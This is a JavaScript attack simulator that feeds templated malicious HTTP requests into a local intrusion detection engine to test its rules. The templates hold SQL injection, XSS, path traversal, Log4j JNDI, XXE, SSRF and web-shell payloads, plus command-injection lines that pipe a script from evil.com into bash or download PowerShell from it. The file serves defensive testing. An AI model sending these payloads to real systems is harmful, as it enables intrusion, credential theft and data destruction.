// Attack Simulator — Generates realistic attack traffic for testing the IDS
class AttackSimulator {
  constructor(idsEngine, broadcast) {
    this.ids = idsEngine;
    this.broadcast = broadcast;
    this.running = false;
    this.timer = null;
    this.attackerIPs = [
      '45.155.205.233', '91.134.148.42', '103.143.227.12', '185.220.101.45',
      '194.165.16.78', '5.188.206.14', '141.98.10.64', '212.193.30.155',
      '167.94.138.1', '198.235.24.201', '23.129.64.210', '31.184.198.85'
    ];
    this.destinations = [
      '10.0.1.5', '10.0.1.10', '10.0.2.20', '192.168.1.100',
      '192.168.1.50', '172.16.0.5', '10.0.0.1'
    ];

    // Attack templates — realistic payloads mapped to attack types
    this.attackTemplates = [
      // SQL Injection
      { attack_type: 'SQL Injection', method: 'GET', path: '/api/user?id=1', query: { id: "1' UNION SELECT username,password FROM users--" }, headers: { 'user-agent': 'Mozilla/5.0' } },
      { attack_type: 'SQL Injection', method: 'GET', path: '/login.php', query: { user: "admin' OR '1'='1", pass: "anything" }, headers: { 'user-agent': 'Mozilla/5.0' } },
      { attack_type: 'SQL Injection', method: 'POST', path: '/api/search', body: { q: "'; DROP TABLE users;--" }, headers: { 'user-agent': 'Mozilla/5.0' } },
      { attack_type: 'SQL Injection', method: 'GET', path: '/products', query: { cat: "1; WAITFOR DELAY '0:0:5'--" }, headers: { 'user-agent': 'Mozilla/5.0' } },
      { attack_type: 'SQL Injection', method: 'GET', path: '/api/data', query: { id: "1 AND (SELECT SUBSTRING(version(),1,1))=5" }, headers: { 'user-agent': 'Mozilla/5.0' } },
      { attack_type: 'SQL Injection', method: 'POST', path: '/auth', body: { username: "admin' AND 1=1--", password: "x" }, headers: { 'user-agent': 'Mozilla/5.0' } },

      // XSS
      { attack_type: 'Cross-Site Scripting (XSS)', method: 'GET', path: '/search', query: { q: '<script>alert("XSS")</script>' }, headers: { 'user-agent': 'Mozilla/5.0' } },
      { attack_type: 'Cross-Site Scripting (XSS)', method: 'GET', path: '/comment', query: { text: '<img src=x onerror=alert(document.cookie)>' }, headers: { 'user-agent': 'Mozilla/5.0' } },
      { attack_type: 'Cross-Site Scripting (XSS)', method: 'POST', path: '/profile', body: { bio: '<svg onload=fetch("http://evil.com/steal?c="+document.cookie)>' }, headers: { 'user-agent': 'Mozilla/5.0' } },
      { attack_type: 'Cross-Site Scripting (XSS)', method: 'GET', path: '/page', query: { ref: 'javascript:void(document.cookie)' }, headers: { 'user-agent': 'Mozilla/5.0' } },
      { attack_type: 'Cross-Site Scripting (XSS)', method: 'GET', path: '/redirect', query: { url: 'javascript:alert(1)' }, headers: { 'user-agent': 'Mozilla/5.0' } },

      // Path Traversal
      { attack_type: 'Path Traversal', method: 'GET', path: '/download', query: { file: '../../../../etc/passwd' }, headers: { 'user-agent': 'Mozilla/5.0' } },
      { attack_type: 'Path Traversal', method: 'GET', path: '/image', query: { path: '..%2f..%2f..%2fetc%2fshadow' }, headers: { 'user-agent': 'Mozilla/5.0' } },
      { attack_type: 'Path Traversal', method: 'GET', path: '/file.php', query: { name: 'C:\\windows\\system32\\config\\SAM' }, headers: { 'user-agent': 'Mozilla/5.0' } },
      { attack_type: 'Path Traversal', method: 'GET', path: '/admin', query: { page: '../../../var/log/auth.log%00' }, headers: { 'user-agent': 'Mozilla/5.0' } },

      // Command Injection
      { attack_type: 'Command Injection', method: 'GET', path: '/ping', query: { host: '8.8.8.8; cat /etc/passwd' }, headers: { 'user-agent': 'Mozilla/5.0' } },
      { attack_type: 'Command Injection', method: 'POST', path: '/api/exec', body: { cmd: '127.0.0.1 | whoami' }, headers: { 'user-agent': 'Mozilla/5.0' } },
      { attack_type: 'Command Injection', method: 'GET', path: '/api/dns', query: { domain: 'example.com`id`' }, headers: { 'user-agent': 'Mozilla/5.0' } },
      { attack_type: 'Command Injection', method: 'POST', path: '/system', body: { task: 'update; $(curl http://evil.com/shell.sh | bash)' }, headers: { 'user-agent': 'Mozilla/5.0' } },

      // Log4j / JNDI
      { attack_type: 'Log4j Injection', method: 'GET', path: '/api/login', query: { user: '${jndi:ldap://evil.com/Exploit}' }, headers: { 'user-agent': '${jndi:ldap://evil.com/x}' } },
      { attack_type: 'Log4j Injection', method: 'GET', path: '/api/v1/data', headers: { 'user-agent': '${jndi:ldap://attacker.com:1389/TomcatBypass/Command/Base64/...}', 'x-api-key': '${jndi:rmi://evil.com:1099/exploit}' } },
      { attack_type: 'Log4j Injection', method: 'POST', path: '/api/log', body: { message: '${jndi:ldap://evil.com/x}' }, headers: { 'user-agent': 'Mozilla/5.0' } },

      // XXE
      { attack_type: 'XXE Injection', method: 'POST', path: '/api/xml', body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', headers: { 'content-type': 'application/xml', 'user-agent': 'Mozilla/5.0' } },
      { attack_type: 'XXE Injection', method: 'POST', path: '/import', body: '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">%dtd;]><data/>', headers: { 'content-type': 'application/xml', 'user-agent': 'Mozilla/5.0' } },

      // OGNL (Struts)
      { attack_type: 'OGNL Injection', method: 'POST', path: '/struts2/showcase.action', body: '%{(#_memberAccess=@java.lang.Runtime@getRuntime()).(#cmd="id")}', headers: { 'user-agent': 'Mozilla/5.0' } },
      { attack_type: 'OGNL Injection', method: 'GET', path: '/confluence/pages/doenterpagevariables.action', query: { queryString: '%{+1+1+}' }, headers: { 'user-agent': 'Mozilla/5.0' } },

      // SSRF
      { attack_type: 'SSRF', method: 'GET', path: '/api/fetch', query: { url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' }, headers: { 'user-agent': 'Mozilla/5.0' } },
      { attack_type: 'SSRF', method: 'GET', path: '/proxy', query: { target: 'http://127.0.0.1:8080/admin' }, headers: { 'user-agent': 'Mozilla/5.0' } },
      { attack_type: 'SSRF', method: 'GET', path: '/api/image', query: { src: 'http://192.168.1.1/cgi-bin/admin?cmd=reboot' }, headers: { 'user-agent': 'Mozilla/5.0' } },

      // LFI
      { attack_type: 'LFI/RFI', method: 'GET', path: '/include', query: { page: 'php://filter/convert.base64-encode/resource=index.php' }, headers: { 'user-agent': 'Mozilla/5.0' } },
      { attack_type: 'LFI/RFI', method: 'GET', path: '/view', query: { file: 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==' }, headers: { 'user-agent': 'Mozilla/5.0' } },

      // Web Shell
      { attack_type: 'Web Shell', method: 'GET', path: '/uploads/c99.php', headers: { 'user-agent': 'Mozilla/5.0' } },
      { attack_type: 'Web Shell', method: 'GET', path: '/images/shell.php', query: { cmd: 'ls -la /tmp' }, headers: { 'user-agent': 'Mozilla/5.0' } },

      // Code Injection
      { attack_type: 'Code Injection', method: 'POST', path: '/api/eval', body: { code: 'eval(base64_decode("c3lzdGVtKCdpZCcpOw=="))' }, headers: { 'user-agent': 'Mozilla/5.0' } },
      { attack_type: 'Code Injection', method: 'POST', path: '/api/process', body: { input: 'file_put_contents("shell.php","<?php system($_GET[c]);?>")' }, headers: { 'user-agent': 'Mozilla/5.0' } },

      // Scanner
      { attack_type: 'Scanner', method: 'GET', path: '/.git/config', headers: { 'user-agent': 'sqlmap/1.5.2#stable (http://sqlmap.org)' } },
      { attack_type: 'Scanner', method: 'GET', path: '/.env', headers: { 'user-agent': 'Nikto/2.1.6' } },
      { attack_type: 'Scanner', method: 'GET', path: '/phpmyadmin/', headers: { 'user-agent': 'masscan/1.3 (https://github.com/robertdavidgraham/masscan)' } },
      { attack_type: 'Scanner', method: 'GET', path: '/wp-admin/', headers: { 'user-agent': 'wpscan/3.8.18' } },
      { attack_type: 'Scanner', method: 'GET', path: '/.well-known/security.txt', headers: { 'user-agent': 'nuclei/v2.9.1' } },

      // PowerShell
      { attack_type: 'Command Injection', method: 'POST', path: '/api/run', body: { script: 'powershell -hidden -encodedcommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABO...' }, headers: { 'user-agent': 'Mozilla/5.0' } },
      { attack_type: 'Command Injection', method: 'GET', path: '/api/exec', query: { cmd: 'powershell IEX(New-Object Net.WebClient).DownloadString("http://evil.com/ps1")' }, headers: { 'user-agent': 'Mozilla/5.0' } },

      // Normal request (for contrast)
      { attack_type: 'NORMAL', method: 'GET', path: '/api/products', query: { page: '1', limit: '20' }, headers: { 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' } },
      { attack_type: 'NORMAL', method: 'GET', path: '/index.html', headers: { 'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)' } },
    ];
  }

  start(interval) {
    if (this.running) return;
    this.running = true;
    console.log('[Simulator] Started. Generating attacks every ' + interval + 'ms');

    const fire = () => {
      const template = this.attackTemplates[Math.floor(Math.random() * this.attackTemplates.length)];
      this.generateAndFire(template);
    };

    // Fire immediately, then on interval
    fire();
    this.timer = setInterval(fire, interval);
  }

  stop() {
    if (this.timer) {
      clearInterval(this.timer);
      this.timer = null;
    }
    this.running = false;
    console.log('[Simulator] Stopped.');
  }

  generateAndFire(template) {
    const event = {
      method: template.method,
      path: template.path,
      query: template.query || null,
      body: template.body || null,
      headers: template.headers,
      sourceIp: this.attackerIPs[Math.floor(Math.random() * this.attackerIPs.length)],
      sourcePort: 40000 + Math.floor(Math.random() * 20000),
      destination: this.destinations[Math.floor(Math.random() * this.destinations.length)],
      attack_type: template.attack_type
    };

    this.fireEvent(event);
  }

  generateAttack(attack_type) {
    const templates = this.attackTemplates.filter(t => t.attack_type === attack_type);
    if (templates.length === 0) return null;

    const template = templates[Math.floor(Math.random() * templates.length)];
    return {
      method: template.method,
      path: template.path,
      query: template.query || null,
      body: template.body || null,
      headers: template.headers,
      sourceIp: this.attackerIPs[Math.floor(Math.random() * this.attackerIPs.length)],
      sourcePort: 40000 + Math.floor(Math.random() * 20000),
      destination: this.destinations[Math.floor(Math.random() * this.destinations.length)],
      attack_type: template.attack_type
    };
  }

  fireEvent(event) {
    try {
      // Inspect the simulated request through the IDS engine
      const result = this.ids.inspectRequest({
        method: event.method,
        path: event.path,
        query: event.query,
        body: event.body,
        headers: event.headers,
        sourceIp: event.sourceIp,
        sourcePort: event.sourcePort,
        destination: event.destination
      });

      console.log('[Simulator] Fired ' + event.attack_type + ' -> detections: ' + result.totalDetections);

      if (result.totalDetections > 0) {
        for (const detection of result.detections) {
          try {
            const eventId = this.ids.logSecurityEvent(detection);
            console.log('[Simulator] Logged event ' + eventId + ': ' + detection.rule_name);
            if (this.broadcast) {
              this.broadcast('events', Object.assign(detection, { id: eventId, timestamp: new Date().toISOString() }));
              if (detection.severity === 'CRITICAL' || detection.severity === 'HIGH') {
                this.broadcast('alerts', {
                  event_id: eventId,
                  alert_type: detection.attack_type,
                  message: detection.severity + ' severity: ' + detection.rule_name + ' from ' + detection.source_ip,
                  timestamp: new Date().toISOString()
                });
              }
              this.broadcast('stats', this.ids.getStats());
            }
          } catch (e) {
            console.error('[Simulator] Error logging event: ' + e.message + ' stack: ' + e.stack);
          }
        }
      }
    } catch (e) {
      console.error('[Simulator] Error in fireEvent: ' + e.message + ' stack: ' + e.stack);
    }
  }
}

module.exports = AttackSimulator;
